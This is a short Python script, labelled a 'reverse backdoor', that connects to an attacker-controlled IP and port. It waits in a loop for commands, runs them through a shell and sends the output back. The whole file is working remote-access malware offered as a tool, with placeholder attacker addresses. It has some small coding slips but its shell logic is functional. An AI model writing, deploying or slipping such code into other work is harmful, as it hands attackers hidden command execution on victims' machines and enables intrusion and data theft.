#!/usr/bin/env python3

# Author: Nikhil Sharma
# Created Date: 29-08-2020
# Last Updated: 08-09-2020
# Operating System: Windows, Linux, Mac
# Description: Creates a reverse backdoor

# Import the necessary libraries
import socket, subprocess, json, os

class Backdoor:
	def __init__(self, ip, port):
		# Create an object of the socket class that establishes a TCP connection under the ipv4 family
		self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		# Connect to a destination by defining its IP and the port number
		self.connection.connect((ip, port))

	# Execute system commands whenever it is called
	def exe_sys_cmds(self, cmd):
		return subprocess.check_output(cmd, shell=True)

	# Data -> received as bytes, therefore needs to be decoded
	def json_send(self, data):
		json_data = json.dumps(data.decode())
		self.connection.sendto(json_data.encode(), (<ATTACKER_IP>, <PORT_NO>))

	def json_receive(self):
		json_data = ""
		while True:
			try:
				json_data = json_data + self.connection.recv(1024).decode()
				return json.loads(json_data)
			except ValueError:
				continue

	def change_working_directory_to(self, path):
		os.chdir(path)
		return "[+] Changing working directory to ", path

	def run(self):
		# Receive data with a buffer/batch size of 1024 bytes and execute the commonds remotely
		while True:
			command = self.json_receive()
			if command[0] == "exit":
				self.connection.close()
				exit()
			elif command[0] == "cd" and len(command) > 1:
				result = self.change_working_directory_to(command[1])
			else:
				result = self.exe_sys_cmds(command)
			self.json_send(result)

my_backdoor = Backdoor(<ATTACKER_IP>, <PORT_NO>)
my_backdoor.run()